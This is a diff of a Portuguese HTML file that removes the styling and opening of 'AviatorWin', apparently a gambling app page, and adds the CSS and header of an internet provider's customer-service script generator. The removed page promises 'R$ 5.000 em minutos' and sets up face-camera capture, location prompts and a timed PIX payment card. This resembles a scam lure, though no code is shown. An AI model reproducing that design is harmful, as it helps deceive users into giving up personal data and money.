@@ -1,1268 +1,1511 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>AviatorWin - Ganhe Agora</title>
-<style>
-  :root{
-    --bg:#f5f5f7;
-    --glass:rgba(255,255,255,0.72);
-    --glass-border:rgba(255,255,255,0.4);
-    --text:#1d1d1f;
-    --muted:#6e6e73;
-    --accent:#0071e3;
-    --accent-dark:#005bb5;
-    --green:#34c759;
-    --red:#ff3b30;
-    --orange:#ff9500;
-    --gold:#ffd700;
-    --shadow:0 10px 40px rgba(0,0,0,0.08);
-    --shadow-lg:0 20px 60px rgba(0,0,0,0.12);
-  }
-  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-  html,body{height:100%;overflow:hidden}
-  body{
-    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Roboto,sans-serif;
-    background:linear-gradient(135deg,#e8f4f8 0%,#f5f5f7 50%,#f0e6ff 100%);
-    color:var(--text);
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    position:relative;
-  }
-  body::before{
-    content:'';position:fixed;inset:0;
-    background:
-      radial-gradient(circle at 20% 20%,rgba(0,113,227,0.15),transparent 40%),
-      radial-gradient(circle at 80% 80%,rgba(255,59,48,0.12),transparent 40%),
-      radial-gradient(circle at 50% 50%,rgba(255,149,0,0.08),transparent 50%);
-    z-index:0;
-  }
-  .app{
-    position:relative;z-index:1;
-    width:100%;max-width:430px;height:100vh;
-    display:flex;flex-direction:column;
-    padding:20px;
-    overflow:hidden;
-  }
-  .screen{
-    display:none;
-    flex:1;
-    flex-direction:column;
-    animation:slideIn .4s ease;
-    overflow-y:auto;
-  }
-  .screen.active{display:flex}
-  @keyframes slideIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
-  
-  /* Header */
-  .header{
-    display:flex;justify-content:space-between;align-items:center;
-    padding:10px 0 20px;
-  }
-  .logo{
-    font-size:22px;font-weight:700;
-    background:linear-gradient(135deg,#ff3b30,#ff9500);
-    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
-    letter-spacing:-0.5px;
-  }
-  .logo span{font-weight:400;color:var(--text);-webkit-text-fill-color:var(--text)}
-  .balance-pill{
-    background:var(--glass);
-    backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
-    border:1px solid var(--glass-border);
-    padding:8px 14px;border-radius:20px;
-    font-size:13px;font-weight:600;
-    box-shadow:var(--shadow);
-  }
-  .balance-pill b{color:var(--green)}
-  
-  /* Glass Card */
-  .card{
-    background:var(--glass);
-    backdrop-filter:blur(30px) saturate(180%);
-    -webkit-backdrop-filter:blur(30px) saturate(180%);
-    border:1px solid var(--glass-border);
-    border-radius:24px;
-    padding:28px 24px;
-    box-shadow:var(--shadow);
-    margin-bottom:16px;
-  }
-  
-  /* Welcome */
-  .hero-emoji{font-size:80px;text-align:center;margin-bottom:10px;animation:bounce 2s infinite}
-  @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
-  .hero-title{
-    font-size:32px;font-weight:800;text-align:center;
-    letter-spacing:-1px;line-height:1.1;margin-bottom:10px;
-  }
-  .hero-title .highlight{
-    background:linear-gradient(135deg,#ff3b30,#ff9500);
-    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
-  }
-  .hero-sub{text-align:center;color:var(--muted);font-size:15px;line-height:1.5;margin-bottom:20px}
-  .jackpot{
-    background:linear-gradient(135deg,#ff3b30,#ff9500);
-    border-radius:20px;padding:20px;text-align:center;
-    color:white;margin-bottom:20px;
-    box-shadow:0 10px 30px rgba(255,59,48,0.3);
-  }
-  .jackpot-label{font-size:12px;opacity:0.9;text-transform:uppercase;letter-spacing:1px}
-  .jackpot-value{font-size:36px;font-weight:800;margin-top:5px;letter-spacing:-1px}
-  .winners-scroll{
-    background:var(--glass);border-radius:16px;padding:12px;
-    border:1px solid var(--glass-border);
-    font-size:13px;color:var(--muted);
-    margin-bottom:20px;
-  }
-  .winners-scroll b{color:var(--green)}
-  
-  /* Buttons */
-  .btn{
-    width:100%;padding:16px;border:none;border-radius:14px;
-    font-size:16px;font-weight:600;cursor:pointer;
-    transition:all .2s;letter-spacing:0.3px;
-  }
-  .btn-primary{
-    background:linear-gradient(135deg,#0071e3,#005bb5);
-    color:white;box-shadow:0 8px 20px rgba(0,113,227,0.3);
-  }
-  .btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 28px rgba(0,113,227,0.4)}
-  .btn-primary:active{transform:translateY(0)}
-  .btn-success{
-    background:linear-gradient(135deg,#34c759,#28a745);
-    color:white;box-shadow:0 8px 20px rgba(52,199,89,0.3);
-  }
-  .btn-danger{
-    background:linear-gradient(135deg,#ff3b30,#d63031);
-    color:white;box-shadow:0 8px 20px rgba(255,59,48,0.3);
-  }
-  .btn-ghost{
-    background:var(--glass);color:var(--text);
-    border:1px solid var(--glass-border);
-  }
-  .btn:disabled{opacity:0.5;cursor:not-allowed}
-  
-  /* Form */
-  .field{margin-bottom:16px}
-  .field label{
-    display:block;font-size:13px;font-weight:600;
-    color:var(--muted);margin-bottom:6px;
-    text-transform:uppercase;letter-spacing:0.5px;
-  }
-  .field input,.field select{
-    width:100%;padding:14px 16px;
-    background:rgba(255,255,255,0.5);
-    border:1px solid rgba(0,0,0,0.08);
-    border-radius:12px;
-    font-size:15px;color:var(--text);
-    transition:all .2s;
-    font-family:inherit;
-  }
-  .field input:focus,.field select:focus{
-    outline:none;
-    border-color:var(--accent);
-    background:white;
-    box-shadow:0 0 0 4px rgba(0,113,227,0.1);
-  }
-  
-  /* Step indicator */
-  .steps{
-    display:flex;gap:6px;margin-bottom:20px;
-  }
-  .step{
-    flex:1;height:4px;border-radius:2px;
-    background:rgba(0,0,0,0.08);
-    transition:all .3s;
-  }
-  .step.active{background:var(--accent)}
-  .step.done{background:var(--green)}
-  
-  /* Camera */
-  .camera-frame{
-    position:relative;
-    width:100%;aspect-ratio:3/4;
-    background:#000;border-radius:20px;overflow:hidden;
-    margin-bottom:16px;
-  }
-  .camera-frame video{
-    width:100%;height:100%;object-fit:cover;
-    transform:scaleX(-1);
-  }
-  .camera-frame .overlay{
-    position:absolute;inset:0;
-    border:3px solid rgba(255,255,255,0.3);
-    border-radius:20px;
-    pointer-events:none;
-  }
-  .camera-frame .face-guide{
-    position:absolute;
-    top:50%;left:50%;
-    transform:translate(-50%,-50%);
-    width:70%;height:55%;
-    border:2px dashed rgba(255,255,255,0.6);
-    border-radius:50%;
-  }
-  .camera-flash{
-    position:absolute;inset:0;
-    background:white;opacity:0;
-    pointer-events:none;
-    transition:opacity .1s;
-  }
-  .camera-flash.active{opacity:1}
-  
-  /* Location */
-  .loc-visual{
-    text-align:center;padding:20px 0;
-  }
-  .loc-visual .icon{font-size:80px;margin-bottom:10px}
-  .loc-visual h3{font-size:22px;font-weight:700;margin-bottom:8px}
-  .loc-visual p{color:var(--muted);font-size:14px;line-height:1.5}
-  .loc-features{
-    display:flex;flex-direction:column;gap:10px;
-    margin:20px 0;
-  }
-  .loc-feature{
-    display:flex;align-items:center;gap:12px;
-    padding:12px;background:rgba(0,0,0,0.03);
-    border-radius:12px;font-size:14px;
-  }
-  .loc-feature .ico{font-size:22px}
-  
-  /* Modal */
-  .modal-bg{
-    position:fixed;inset:0;
-    background:rgba(0,0,0,0.5);
-    backdrop-filter:blur(10px);
-    display:none;
-    justify-content:center;align-items:center;
-    z-index:100;padding:20px;
-  }
-  .modal-bg.active{display:flex}
-  .modal{
-    background:white;
-    border-radius:24px;
-    padding:28px;
-    max-width:360px;width:100%;
-    text-align:center;
-    animation:popIn .3s ease;
-  }
-  @keyframes popIn{from{transform:scale(0.9);opacity:0}to{transform:scale(1);opacity:1}}
-  .modal .emoji{font-size:60px;margin-bottom:10px}
-  .modal h3{font-size:20px;font-weight:700;margin-bottom:8px}
-  .modal p{color:var(--muted);font-size:14px;line-height:1.5;margin-bottom:16px}
-  .modal .reasons{
-    text-align:left;
-    background:rgba(255,59,48,0.08);
-    border-radius:12px;padding:12px;
-    margin-bottom:16px;font-size:13px;
-  }
-  .modal .reasons div{padding:4px 0;color:#c0392b}
-  .modal .reasons div::before{content:'⚠️ '}
-  
-  /* Game Aviator */
-  .game-area{
-    position:relative;
-    background:linear-gradient(180deg,#1a1a2e 0%,#16213e 100%);
-    border-radius:20px;
-    height:280px;
-    overflow:hidden;
-    margin-bottom:16px;
-  }
-  .game-area .stars{
-    position:absolute;inset:0;
-    background-image:
-      radial-gradient(2px 2px at 20% 30%,white,transparent),
-      radial-gradient(2px 2px at 60% 70%,white,transparent),
-      radial-gradient(1px 1px at 50% 50%,white,transparent),
-      radial-gradient(1px 1px at 80% 10%,white,transparent),
-      radial-gradient(2px 2px at 90% 60%,white,transparent);
-    background-size:200px 200px;
-    opacity:0.6;
-  }
-  .multiplier{
-    position:absolute;
-    top:50%;left:50%;
-    transform:translate(-50%,-50%);
-    font-size:48px;font-weight:800;
-    color:white;
-    text-shadow:0 0 20px rgba(255,255,255,0.5);
-    font-family:'Courier New',monospace;
-  }
-  .multiplier.crashed{color:var(--red)}
-  .multiplier.cashed{color:var(--green)}
-  .plane{
-    position:absolute;
-    font-size:40px;
-    bottom:40px;left:20px;
-    transition:all .1s linear;
-    filter:drop-shadow(0 0 10px rgba(255,149,0,0.8));
-  }
-  .plane.flying{animation:fly 3s linear infinite}
-  @keyframes fly{
-    0%{transform:translate(0,0) rotate(-10deg)}
-    50%{transform:translate(150px,-80px) rotate(-5deg)}
-    100%{transform:translate(300px,-160px) rotate(0deg)}
-  }
-  .plane.crashed{
-    animation:crash .5s ease forwards;
-  }
-  @keyframes crash{
-    to{transform:translate(300px,-160px) rotate(90deg);opacity:0}
-  }
-  .bet-controls{
-    display:grid;grid-template-columns:1fr 1fr;gap:10px;
-    margin-bottom:16px;
-  }
-  .bet-input{
-    background:var(--glass);
-    border:1px solid var(--glass-border);
-    border-radius:14px;
-    padding:14px;
-    backdrop-filter:blur(20px);
-  }
-  .bet-input label{font-size:11px;color:var(--muted);text-transform:uppercase;font-weight:600}
-  .bet-input input{
-    width:100%;border:none;background:transparent;
-    font-size:20px;font-weight:700;color:var(--text);
-    margin-top:4px;
-  }
-  .bet-input input:focus{outline:none}
-  .history{
-    display:flex;gap:6px;overflow-x:auto;
-    padding:8px 0;margin-bottom:16px;
-  }
-  .history-item{
-    padding:6px 12px;border-radius:12px;
-    font-size:12px;font-weight:700;
-    white-space:nowrap;
-    background:rgba(0,0,0,0.05);
-  }
-  .history-item.win{background:rgba(52,199,89,0.15);color:var(--green)}
-  .history-item.lose{background:rgba(255,59,48,0.15);color:var(--red)}
-  
-  /* PIX */
-  .pix-card{
-    background:linear-gradient(135deg,#34c759,#28a745);
-    border-radius:20px;padding:24px;color:white;
-    text-align:center;margin-bottom:16px;
-  }
-  .pix-card .label{font-size:12px;opacity:0.9;text-transform:uppercase}
-  .pix-card .value{font-size:28px;font-weight:800;margin:8px 0}
-  .pix-card .key{
-    background:rgba(255,255,255,0.2);
-    padding:10px;border-radius:10px;
-    font-size:13px;font-family:monospace;
-    word-break:break-all;
-  }
-  .timer{
-    text-align:center;font-size:14px;color:var(--muted);
-    margin-bottom:16px;
-  }
-  .timer b{color:var(--red);font-size:18px}
-  
-  /* Loading */
-  .loader{
-    width:40px;height:40px;
-    border:3px solid rgba(0,113,227,0.2);
-    border-top-color:var(--accent);
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-    margin:20px auto;
-  }
-  @keyframes spin{to{transform:rotate(360deg)}}
-  
-  .hidden{display:none!important}
-  .text-center{text-align:center}
-  .mt-10{margin-top:10px}
-  .mt-20{margin-top:20px}
-  .mb-10{margin-bottom:10px}
-  
-  /* Scrollbar */
-  .screen::-webkit-scrollbar{width:0}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌐 Gerador de Script ADM | Provedor de Internet</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🌐</text></svg>">
+    <style>
+        :root {
+            --primary-50: #ecfdf5;
+            --primary-100: #d1fae5;
+            --primary-200: #a7f3d0;
+            --primary-300: #6ee7b7;
+            --primary-400: #34d399;
+            --primary-500: #10b981;
+            --primary-600: #059669;
+            --primary-700: #047857;
+            --primary-800: #065f46;
+            --primary-900: #064e3b;
+            --gray-50: #f9fafb;
+            --gray-100: #f3f4f6;
+            --gray-200: #e5e7eb;
+            --gray-300: #d1d5db;
+            --gray-400: #9ca3af;
+            --gray-500: #6b7280;
+            --gray-600: #4b5563;
+            --gray-700: #374151;
+            --gray-800: #1f2937;
+            --gray-900: #111827;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+            --glass-bg: rgba(255, 255, 255, 0.7);
+            --glass-border: rgba(255, 255, 255, 0.5);
+            --glass-blur: blur(20px);
+            --transition-fast: 0.15s ease;
+            --transition-base: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --radius-xl: 24px;
+            --radius-full: 9999px;
+            --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html { scroll-behavior: smooth; -webkit-font-smoothing: antialiased; }
+
+        body {
+            font-family: var(--font-sans);
+            background: linear-gradient(135deg, var(--primary-50) 0%, #f0fdf4 50%, var(--primary-100) 100%);
+            background-attachment: fixed;
+            color: var(--gray-800);
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%; right: -20%;
+            width: 800px; height: 800px;
+            background: radial-gradient(circle, rgba(16, 185, 129, 0.15) 0%, transparent 70%);
+            border-radius: 50%; z-index: -1;
+        }
+
+        .app-container { max-width: 1440px; margin: 0 auto; padding: 24px; }
+
+        .header {
+            background: var(--glass-bg);
+            backdrop-filter: var(--glass-blur);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-xl);
+            padding: 24px 32px;
+            margin-bottom: 24px;
+            box-shadow: var(--shadow-lg);
+            display: flex; align-items: center; gap: 20px;
+        }
+
+        .logo-container {
+            width: 64px; height: 64px;
+            background: linear-gradient(135deg, var(--primary-500), var(--primary-700));
+            border-radius: var(--radius-md);
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .logo-container svg { width: 36px; height: 36px; color: white; }
+
+        .header-content h1 {
+            font-size: 1.6rem;
+            background: linear-gradient(135deg, var(--primary-700), var(--primary-500));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 4px;
+        }
+
+        .header-content p { color: var(--gray-600); font-size: 0.95rem; }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr 380px;
+            gap: 24px;
+            align-items: start;
+        }
+
+        @media (max-width: 1024px) { .main-grid { grid-template-columns: 1fr; } }
+
+        .card {
+            background: var(--glass-bg);
+            backdrop-filter: var(--glass-blur);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-xl);
+            padding: 28px;
+            margin-bottom: 24px;
+            box-shadow: var(--shadow-lg);
+            transition: var(--transition-base);
+        }
+
+        .card:hover { box-shadow: var(--shadow-xl); }
+
+        .card-header {
+            display: flex; align-items: center; gap: 12px;
+            margin-bottom: 24px; padding-bottom: 16px;
+            border-bottom: 2px solid var(--primary-100);
+        }
+
+        .card-icon {
+            width: 40px; height: 40px;
+            background: linear-gradient(135deg, var(--primary-100), var(--primary-200));
+            border-radius: var(--radius-md);
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .card-icon svg { width: 22px; height: 22px; color: var(--primary-700); }
+
+        .card-title { font-size: 1.2rem; color: var(--gray-900); font-weight: 700; }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 16px;
+        }
+
+        .form-group { display: flex; flex-direction: column; gap: 6px; }
+        .form-group.full-width { grid-column: 1 / -1; }
+
+        .form-label {
+            font-size: 0.85rem; font-weight: 600; color: var(--gray-700);
+            display: flex; align-items: center; gap: 6px;
+        }
+
+        .form-label .required { color: var(--danger); font-weight: 700; }
+
+        .form-input, .form-select {
+            width: 100%; padding: 12px 16px;
+            background: white; border: 2px solid var(--gray-200);
+            border-radius: var(--radius-md);
+            font-family: var(--font-sans); font-size: 0.95rem;
+            color: var(--gray-800); transition: var(--transition-fast); outline: none;
+        }
+
+        .form-input:focus, .form-select:focus {
+            border-color: var(--primary-500);
+            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.1);
+        }
+
+        .form-input.error { border-color: var(--danger); background: #fef2f2; }
+
+        .checkbox-group {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 10px; margin-top: 8px;
+        }
+
+        .checkbox-item {
+            display: flex; align-items: center;
+            padding: 10px 14px;
+            background: white; border: 2px solid var(--gray-200);
+            border-radius: var(--radius-md);
+            cursor: pointer; transition: var(--transition-fast);
+            font-size: 0.9rem;
+        }
+
+        .checkbox-item:hover { border-color: var(--primary-300); background: var(--primary-50); }
+        .checkbox-item.selected { border-color: var(--primary-500); background: var(--primary-50); }
+        .checkbox-item input { display: none; }
+
+        .checkbox-custom {
+            width: 20px; height: 20px;
+            background: white; border: 2px solid var(--gray-300);
+            border-radius: 4px; margin-right: 10px;
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0; transition: var(--transition-fast);
+        }
+
+        .checkbox-item.selected .checkbox-custom {
+            background: var(--primary-500); border-color: var(--primary-500);
+        }
+
+        .checkbox-custom svg { width: 14px; height: 14px; color: white; display: none; }
+        .checkbox-item.selected .checkbox-custom svg { display: block; }
+
+        .planos-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 16px;
+        }
+
+        .plano-card {
+            background: white;
+            border: 2px solid var(--gray-200);
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            cursor: pointer;
+            transition: var(--transition-base);
+            position: relative;
+        }
+
+        .plano-card::before {
+            content: '';
+            position: absolute; top: 0; left: 0; right: 0;
+            height: 4px; background: var(--primary-500);
+            transform: scaleX(0); transition: var(--transition-base);
+        }
+
+        .plano-card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-lg);
+            border-color: var(--primary-300);
+        }
+
+        .plano-card.selected {
+            border-color: var(--primary-500);
+            background: linear-gradient(135deg, var(--primary-50), white);
+            transform: translateY(-4px) scale(1.02);
+        }
+
+        .plano-card.selected::before { transform: scaleX(1); }
+
+        .plano-nome {
+            font-size: 0.85rem; font-weight: 600;
+            color: var(--gray-600); text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+
+        .plano-velocidade {
+            font-size: 2rem; font-weight: 800;
+            color: var(--gray-900); line-height: 1; margin-bottom: 4px;
+        }
+
+        .plano-velocidade span { font-size: 1rem; font-weight: 600; color: var(--gray-600); }
+
+        .plano-valor { font-size: 1.4rem; font-weight: 700; color: var(--primary-700); margin: 12px 0; }
+        .plano-valor small { font-size: 0.8rem; font-weight: 500; color: var(--gray-500); }
+
+        .plano-select-btn {
+            width: 100%; padding: 10px;
+            background: var(--primary-500); color: white;
+            border: none; border-radius: var(--radius-md);
+            font-weight: 600; cursor: pointer;
+            transition: var(--transition-fast);
+        }
+
+        .plano-select-btn:hover { background: var(--primary-600); }
+
+        .promo-section {
+            margin-top: 20px;
+            padding: 20px;
+            background: linear-gradient(135deg, var(--primary-50), white);
+            border-radius: var(--radius-lg);
+            border: 2px dashed var(--primary-300);
+            display: none;
+        }
+
+        .promo-section.show { display: block; }
+
+        .promo-header {
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 12px;
+        }
+
+        .promo-title {
+            font-weight: 700; color: var(--primary-700);
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        .checkbox-custom-promo {
+            display: flex; align-items: center; gap: 10px;
+            cursor: pointer; user-select: none;
+        }
+
+        .checkbox-custom-promo input { display: none; }
+
+        .checkmark-promo {
+            width: 22px; height: 22px;
+            background: white; border: 2px solid var(--gray-300);
+            border-radius: 6px;
+            display: flex; align-items: center; justify-content: center;
+            transition: var(--transition-fast);
+        }
+
+        .checkbox-custom-promo input:checked + .checkmark-promo {
+            background: var(--primary-500); border-color: var(--primary-500);
+        }
+
+        .checkmark-promo svg { display: none; width: 14px; height: 14px; color: white; }
+        .checkbox-custom-promo input:checked + .checkmark-promo svg { display: block; }
+
+        .promo-original {
+            font-size: 1rem; color: var(--gray-600);
+            text-decoration: line-through; margin-bottom: 12px;
+        }
+
+        .promo-input-group { display: none; }
+        .promo-input-group.show { display: block; }
+
+        .promo-input-group label {
+            font-size: 0.85rem; font-weight: 600;
+            color: var(--gray-700); margin-bottom: 6px; display: block;
+        }
+
+        .servicos-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 16px;
+        }
+
+        .servico-card {
+            background: white;
+            border: 2px solid var(--gray-200);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            transition: var(--transition-base);
+        }
+
+        .servico-card:hover { transform: translateY(-4px); box-shadow: var(--shadow-lg); }
+        .servico-card.selected { border-color: var(--primary-500); }
+
+        .servico-content { padding: 16px; }
+
+        .servico-nome { font-size: 1.1rem; font-weight: 700; color: var(--gray-900); margin-bottom: 6px; }
+        .servico-desc { font-size: 0.85rem; color: var(--gray-600); margin-bottom: 12px; }
+
+        .servico-controles { margin: 12px 0; }
+        .servico-controles label {
+            display: block; font-size: 0.85rem; font-weight: 600;
+            color: var(--gray-700); margin-bottom: 6px;
+        }
+
+        .quantidade-input { display: flex; align-items: center; gap: 10px; }
+
+        .quantidade-btn {
+            width: 36px; height: 36px;
+            background: var(--gray-100); border: 2px solid var(--gray-200);
+            border-radius: var(--radius-md);
+            cursor: pointer; font-size: 1.2rem; font-weight: 700;
+            color: var(--gray-700); transition: var(--transition-fast);
+        }
+
+        .quantidade-btn:hover {
+            background: var(--primary-500); color: white; border-color: var(--primary-500);
+        }
+
+        .quantidade-value {
+            flex: 1; text-align: center; font-size: 1.2rem; font-weight: 700;
+            color: var(--gray-800); padding: 8px;
+            background: var(--gray-50); border-radius: var(--radius-md);
+        }
+
+        .dias-selector {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px; margin-top: 10px;
+        }
+
+        .dias-opcao {
+            padding: 10px;
+            background: var(--gray-50);
+            border: 2px solid var(--gray-200);
+            border-radius: var(--radius-md);
+            cursor: pointer; text-align: center;
+            transition: var(--transition-fast);
+        }
+
+        .dias-opcao:hover { border-color: var(--primary-300); }
+        .dias-opcao.selected { border-color: var(--primary-500); background: var(--primary-50); }
+
+        .dias-opcao-label { font-size: 0.85rem; font-weight: 600; color: var(--gray-700); }
+        .dias-opcao-valor { font-size: 0.95rem; font-weight: 700; color: var(--primary-700); margin-top: 2px; }
+
+        .servico-valor-total {
+            font-size: 1.3rem; font-weight: 800;
+            color: var(--primary-700); margin-top: 12px;
+        }
+
+        .servico-add-btn {
+            width: 100%; padding: 10px; margin-top: 12px;
+            background: var(--gray-100); color: var(--gray-700);
+            border: 2px solid var(--gray-200);
+            border-radius: var(--radius-md);
+            font-weight: 600; cursor: pointer;
+            transition: var(--transition-fast);
+        }
+
+        .servico-add-btn:hover {
+            background: var(--primary-500); color: white; border-color: var(--primary-500);
+        }
+
+        .servico-card.selected .servico-add-btn {
+            background: var(--primary-500); color: white;
+        }
+
+        .adesao-opcoes {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px; margin-bottom: 16px;
+        }
+
+        .adesao-opcao {
+            padding: 16px; background: white;
+            border: 2px solid var(--gray-200);
+            border-radius: var(--radius-md);
+            cursor: pointer; text-align: center;
+            transition: var(--transition-fast);
+        }
+
+        .adesao-opcao:hover { border-color: var(--primary-300); }
+        .adesao-opcao.selected { border-color: var(--primary-500); background: var(--primary-50); }
+
+        .adesao-detalhes {
+            display: none; padding: 16px;
+            background: var(--gray-50);
+            border-radius: var(--radius-md); margin-top: 12px;
+        }
+
+        .adesao-detalhes.show { display: block; }
+
+        .resumo-card {
+            position: sticky; top: 24px;
+            background: linear-gradient(135deg, var(--primary-600), var(--primary-800));
+            color: white; border-radius: var(--radius-xl);
+            padding: 28px; box-shadow: var(--shadow-xl);
+        }
+
+        .resumo-header {
+            display: flex; align-items: center; gap: 12px;
+            margin-bottom: 24px; padding-bottom: 16px;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .resumo-header-icon {
+            width: 40px; height: 40px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: var(--radius-md);
+            display: flex; align-items: center; justify-content: center;
+        }
+
+        .resumo-header-icon svg { width: 22px; height: 22px; color: white; }
+        .resumo-title { font-size: 1.2rem; font-weight: 700; }
+
+        .resumo-item {
+            display: flex; justify-content: space-between;
+            padding: 12px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+        }
+
+        .resumo-item-value-promo {
+            color: #fbbf24;
+            text-decoration: line-through;
+            font-size: 0.85rem;
+        }
+
+        .resumo-total {
+            display: flex; justify-content: space-between;
+            padding: 20px 0 0; margin-top: 12px;
+            border-top: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .resumo-total-label { font-size: 1.1rem; font-weight: 700; }
+        .resumo-total-value { font-size: 1.8rem; font-weight: 800; }
+
+        .actions-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 12px; margin-top: 24px;
+        }
+
+        .btn {
+            padding: 14px 20px; border: none;
+            border-radius: var(--radius-md);
+            font-family: var(--font-sans); font-size: 0.9rem; font-weight: 600;
+            cursor: pointer; transition: var(--transition-fast);
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+
+        .btn svg { width: 18px; height: 18px; }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary-500), var(--primary-700));
+            color: white; box-shadow: var(--shadow-md);
+        }
+
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: var(--shadow-lg); }
+
+        .btn-secondary {
+            background: white; color: var(--gray-700);
+            border: 2px solid var(--gray-200);
+        }
+
+        .btn-secondary:hover { border-color: var(--primary-500); color: var(--primary-700); }
+
+        .btn-danger {
+            background: white; color: var(--danger);
+            border: 2px solid var(--danger);
+        }
+
+        .btn-danger:hover { background: var(--danger); color: white; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* Script Output - Live Preview */
+        .script-output {
+            margin-top: 20px; padding: 20px;
+            background: var(--gray-900); border-radius: var(--radius-lg);
+            color: var(--gray-100);
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem; line-height: 1.8;
+            white-space: pre-wrap; display: none;
+            position: relative;
+        }
+
+        .script-output.show { display: block; }
+
+        .script-output::before {
+            content: '🔄 ATUALIZAÇÃO EM TEMPO REAL';
+            position: absolute;
+            top: 8px;
+            right: 12px;
+            font-size: 0.7rem;
+            color: var(--primary-400);
+            font-family: var(--font-sans);
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .toast-container {
+            position: fixed; top: 24px; right: 24px;
+            z-index: 1000; display: flex; flex-direction: column; gap: 12px;
+        }
+
+        .toast {
+            background: white; border-radius: var(--radius-md);
+            padding: 16px 20px; box-shadow: var(--shadow-xl);
+            display: flex; align-items: center; gap: 12px;
+            min-width: 300px; animation: slideIn 0.4s ease;
+            border-left: 4px solid var(--primary-500);
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .toast.success { border-left-color: var(--success); }
+        .toast.error { border-left-color: var(--danger); }
+
+        .toast-message { flex: 1; font-size: 0.9rem; color: var(--gray-800); }
+        .toast-close { background: none; border: none; cursor: pointer; color: var(--gray-400); }
+
+        @media (max-width: 768px) {
+            .app-container { padding: 12px; }
+            .header { flex-direction: column; text-align: center; }
+            .planos-grid, .servicos-grid { grid-template-columns: 1fr; }
+            .checkbox-group { grid-template-columns: 1fr 1fr; }
+        }
+    </style>
 </head>
 <body>
+    <div class="toast-container" id="toastContainer"></div>
 
-<div class="app">
+    <div class="app-container">
+        <header class="header">
+            <div class="logo-container">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0"/>
+                </svg>
+            </div>
+            <div class="header-content">
+                <h1>🌐 Gerador de Script ADM</h1>
+                <p>Preencha os dados para gerar o script de atendimento</p>
+            </div>
+        </header>
 
-  <!-- TELA 1: WELCOME -->
-  <div class="screen active" id="s1">
-    <div class="header">
-      <div class="logo">Aviator<span>Win</span> ✈️</div>
-      <div class="balance-pill">Saldo: <b>R$ 0,00</b></div>
-    </div>
-    
-    <div class="hero-emoji">️💰</div>
-    <h1 class="hero-title">
-      Ganhe até <span class="highlight">R$ 5.000</span><br>em minutos
